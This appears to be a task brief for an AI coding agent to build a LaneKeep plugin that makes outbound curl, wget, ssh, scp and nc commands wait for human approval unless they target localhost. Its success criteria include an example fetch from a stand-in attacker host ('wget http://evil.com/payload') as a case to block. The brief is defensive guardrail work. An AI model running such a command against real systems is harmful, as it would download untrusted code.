# Goal

Build a LaneKeep plugin evaluator that intercepts outbound network commands (`curl`, `wget`, `ssh`, `scp`, `nc`) and requires human approval unless the target is localhost.

## Implementation Blueprint

- Create `lanekeep/plugins.d/net-egress-guard.plugin.sh` following the evaluator convention in `plugins.d/examples/`
- Export globals: `NET_EGRESS_GUARD_PASSED`, `NET_EGRESS_GUARD_REASON`, `NET_EGRESS_GUARD_DECISION`
- Match Bash tool calls containing network egress commands
- Allow if target is `localhost`, `127.0.0.1`, or `::1`; escalate to human approval otherwise
- Register via `LANEKEEP_PLUGIN_EVALS`
- Tools needed: Write, Edit, Bash (for running tests)

## Anti-Patterns

- Do not modify core evaluators — this is a plugin, keep it self-contained
- Do not shell out to external binaries — keep it pure Bash + jq
- Avoid Agent tool for this focused task

## Budget

- Maximum 50 actions
- Timeout: 30 minutes

## Success Criteria

- `bats lanekeep/tests/test-net-egress-guard.bats` passes
- Plugin blocks `curl https://example.com` and `wget http://evil.com/payload`
- Plugin allows `curl http://localhost:8080/health` and `nc -z 127.0.0.1 80`
- Follows existing plugin conventions (see `plugins.d/examples/`)
